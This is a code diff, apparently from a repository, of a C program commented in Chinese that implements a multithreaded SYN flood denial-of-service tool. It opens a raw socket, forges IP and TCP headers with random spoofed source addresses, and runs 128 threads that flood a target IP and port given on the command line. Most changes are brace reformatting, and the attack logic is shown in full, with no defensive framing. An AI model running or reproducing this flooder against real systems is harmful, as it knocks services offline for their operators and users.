@@ -19,6 +19,7 @@
 #include <stdlib.h>
 #include <time.h> 
 #include <arpa/inet.h>
+#include <pthread.h>
 
 /* 最多线程数 */
 #define MAXCHILD 128
@@ -57,8 +58,7 @@ struct tcphdr{
 	unsigned short      urp;
 };
 
-struct pseudohdr
-{
+struct pseudohdr{
 	unsigned int	    saddr;
 	unsigned int 	    daddr;
 	char                zero;
@@ -67,9 +67,7 @@ struct pseudohdr
 };
 
 /* CRC16校验 */
-unsigned short inline
-checksum (unsigned short *buffer, unsigned short size)     
-{  
+unsigned short inline checksum (unsigned short *buffer, unsigned short size){  
 
 	unsigned long cksum = 0;
 	
@@ -93,9 +91,7 @@ checksum (unsigned short *buffer, unsigned short size)
  * TCP伪头部仅用于校验和的计算
 
  */
-void
-init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
-{
+void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader){
 	int len = sizeof(struct ip) + sizeof(struct tcphdr);
 	// IP头部数据初始化
 	ip->hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
@@ -134,9 +130,7 @@ init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
  * 填写IP头部，TCP头部
  * TCP伪头部仅用于校验和的计算
  */
-void
-send_synflood(struct sockaddr_in *addr)
-{ 
+void *send_synflood(struct sockaddr_in *addr){ 
 	char buf[100], sendbuf[100];
 	int len;
 	struct ip ip;			//IP头部
@@ -150,8 +144,7 @@ send_synflood(struct sockaddr_in *addr)
 	init_header(&ip, &tcp, &pseudoheader);
 	
 	/* 处于活动状态时持续发送SYN包 */
-	while(alive)
-	{
+	while(alive){
 		ip.sourceIP = rand();
 
 		//计算IP校验和
@@ -171,10 +164,7 @@ send_synflood(struct sockaddr_in *addr)
 		memcpy(sendbuf, &ip, sizeof(struct ip));
 		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
 		printf(".");
-		if (
-			sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
-			< 0)
-		{
+		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
 			perror("sendto()");
 			pthread_exit("fail");
 		}
@@ -183,16 +173,12 @@ send_synflood(struct sockaddr_in *addr)
 }
 
 /* 信号处理函数,设置退出变量alive */
-void 
-sig_int(int signo)
-{
+void sig_int(int signo){
 	alive = 0;
 }
 
 /* 主函数 */
-int 
-main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]){
 	struct sockaddr_in addr;
 	struct hostent * host = NULL;
 
@@ -206,8 +192,7 @@ main(int argc, char *argv[])
 	signal(SIGINT, sig_int);
 
 	/* 参数是否数量正确 */
-	if(argc < 3)
-	{
+	if(argc < 3){
 		printf("usage: syn <IPaddress> <Port>\n");
 		exit(1);
 	}
@@ -220,12 +205,10 @@ main(int argc, char *argv[])
 	addr.sin_family = AF_INET;
 	addr.sin_port = htons(dst_port);
 
-	if(inet_addr(dst_ip) == INADDR_NONE)
-	{
+	if(inet_addr(dst_ip) == INADDR_NONE){
 		/* 为DNS地址，查询并转换成IP地址 */
 		host = gethostbyname(argv[1]);
-		if(host == NULL)
-		{
+		if(host == NULL){
 			perror("gethostbyname()");
 			exit(1);
 		}
@@ -235,8 +218,7 @@ main(int argc, char *argv[])
 	else
 		addr.sin_addr.s_addr = inet_addr(dst_ip);
 
-	if( dst_port < 0 || dst_port > 65535 )
-	{
+	if( dst_port < 0 || dst_port > 65535 ){
 		printf("Port Error\n");
 		exit(1);
 	}
@@ -245,14 +227,12 @@ main(int argc, char *argv[])
 
 	/* 建立原始socket */
 	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
-	if (sockfd < 0)	   
-	{
+	if (sockfd < 0){
 		perror("socket()");
 		exit(1);
 	}
 	/* 设置IP选项 */
-	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
-	{
+	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0){
 		perror("setsockopt()");
 		exit(1);
 	}
@@ -261,22 +241,18 @@ main(int argc, char *argv[])
 	setuid(getpid());
 
 	/* 建立多个线程协同工作 */
-	for(i=0; i<MAXCHILD; i++)
-	{
+	for(i=0; i<MAXCHILD; i++){
 		err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
-		if(err != 0)
-		{
+		if(err != 0){
 			perror("pthread_create()");
 			exit(1);
 		}
 	}
 
 	/* 等待线程结束 */
-	for(i=0; i<MAXCHILD; i++)
-	{
+	for(i=0; i<MAXCHILD; i++){
 		err = pthread_join(pthread[i], NULL);
-		if(err != 0)
-		{
+		if(err != 0){
 			perror("pthread_join Error\n");
 			exit(1);
 		}
